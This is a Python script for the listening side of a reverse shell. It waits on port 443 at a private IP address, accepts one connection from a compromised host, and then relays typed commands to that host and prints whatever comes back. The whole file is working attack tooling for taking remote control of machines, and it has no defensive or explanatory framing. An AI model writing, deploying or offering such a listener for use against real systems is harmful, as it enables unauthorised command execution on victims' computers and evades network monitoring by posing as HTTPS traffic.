#!/usr/bin/env python3

import socket
from myUtils import show_message, setup_signal_handler

### Classes ##################################################################################################################

class Listener:

    def __init__(self, ip, port):

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((ip, port))
        server_socket.listen()

        show_message("Listening form incomming connections...")

        self.client_socket, client_address = server_socket.accept()

        show_message("Connection established by", "minus", client_address)

    def execute(self, command):
        self.client_socket.send(command.encode())

        response = b""
        while True:
            chunk = self.client_socket.recv(1024)
            if not chunk or chunk.endswith(b"\n\n"):
                response += chunk
                break
            response += chunk

        return response.decode(errors="ignore")

    def run(self):        
        while True:
            try:
                command = input(">> ").strip()

                if command.lower() == "exit":
                    show_message("Closing connection", "info")
                    self.client_socket.close()
                    break

                output = self.execute(command)
                print(output)

            except BrokenPipeError:
                show_message("Connection lost: Broken pipe", "error")
                break

            except Exception as e:
                show_message("Unexpected error", "error", str(e))
                break

### Main Code ################################################################################################################

def main():
    setup_signal_handler() 

    try:
        my_listener = Listener("10.160.4.51", 443)
        my_listener.run()

    except PermissionError:
        show_message("You need to execute this as root", "error")

if __name__ == "__main__":
    main()
